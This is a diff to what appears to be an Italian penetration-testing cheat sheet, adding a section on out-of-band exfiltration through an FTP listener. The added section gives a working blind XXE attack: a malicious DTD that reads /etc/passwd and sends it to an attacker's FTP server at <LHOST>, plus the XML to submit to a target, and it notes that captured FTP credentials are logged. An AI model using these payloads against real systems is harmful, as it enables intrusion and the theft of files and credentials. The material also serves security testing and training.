@@ -63,6 +63,42 @@ wget -m --no-passive ftp://anonymous:anonymous@<IP>  # Scarica tutto il server F
 openssl s_client -connect <IP>:21 -starttls ftp      # Verifica certificati SSL/TLS
 ```
 
+## OOB con catch
+
+Il server FTP di catch è pensato per esfiltrare dati da **blind XXE**.
+
+```bash
+# Avvia il FTP logger
+catch ftp on [--port 2121]
+```
+
+### Esfiltrazione dati da blind XXE
+
+Se trovi un endpoint che parsa XML (upload, API SOAP, import), puoi esfiltrare file
+del target facendogli inviare il contenuto come path FTP.
+
+1. Crea un DTD malevolo in `static/evil.dtd` (via SLWeb):
+
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % send "<!ENTITY exfil SYSTEM 'ftp://<LHOST>:2121/%data;'>">
+%send;
+```
+
+2. Invia l'XML al target:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://<LHOST>:2727/static/evil.dtd">
+  %xxe;
+]>
+<foo>&exfil;</foo>
+```
+
+Nel log di `catch logs ftp` vedi il contenuto di `/etc/passwd` come path FTP.
+
+Le credenziali FTP tentate dal target vengono loggate automaticamente (USER + PASS).
+
 ## Tool consigliati
 
 *Installa con `use <tool>` + `install`*
